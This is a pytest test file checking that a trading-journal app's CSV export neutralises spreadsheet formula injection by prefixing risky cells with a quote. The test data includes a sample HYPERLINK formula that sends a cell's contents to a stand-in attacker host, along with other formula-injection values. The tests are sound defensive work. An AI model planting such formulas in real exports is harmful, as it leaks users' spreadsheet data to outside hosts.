"""CSV export must not hand spreadsheet formulas to the user's Excel/Sheets."""

import csv
import io

import pytest


class _FakeDb:
    def __init__(self, rows):
        self._rows = rows

    def export_trades_csv(self, user_id, days=365):
        return self._rows


@pytest.fixture
def export(auth_client, monkeypatch):
    import carrac.auth.decorators as dec
    import carrac.journal.routes as routes

    monkeypatch.setattr(dec, 'get_tier_limits', lambda tier: {'data_export': True})

    def _go(rows):
        monkeypatch.setattr(routes, 'get_content_db', lambda: _FakeDb(rows))
        resp = auth_client.get('/api/journal/export/csv')
        assert resp.status_code == 200
        return list(csv.DictReader(io.StringIO(resp.get_data(as_text=True))))

    return _go


def test_formula_in_notes_is_neutralised(export):
    payload = '=HYPERLINK("http://evil.example/?x="&A1,"click")'
    rows = export([{'id': 1, 'asset': 'BTC', 'notes': payload, 'tags': '+cmd',
                    'mood': '@SUM(1)', 'setup_type': '-2+3', 'pnl_currency': -12.5}])
    assert rows[0]['notes'] == "'" + payload
    assert rows[0]['tags'] == "'+cmd"
    assert rows[0]['mood'] == "'@SUM(1)"
    assert rows[0]['setup_type'] == "'-2+3"
    # numbers (a legitimate negative P&L) are untouched
    assert rows[0]['pnl_currency'] == '-12.5'


def test_tab_and_cr_prefixed_cells_are_neutralised(export):
    rows = export([{'id': 1, 'notes': '\t=1+1', 'tags': '\r=1+1'}])
    assert rows[0]['notes'].startswith("'")
    assert rows[0]['tags'].startswith("'")


def test_plain_text_is_unchanged(export):
    rows = export([{'id': 2, 'asset': 'ETH', 'notes': 'ordinary note'}])
    assert rows[0]['notes'] == 'ordinary note'
    assert rows[0]['asset'] == 'ETH'
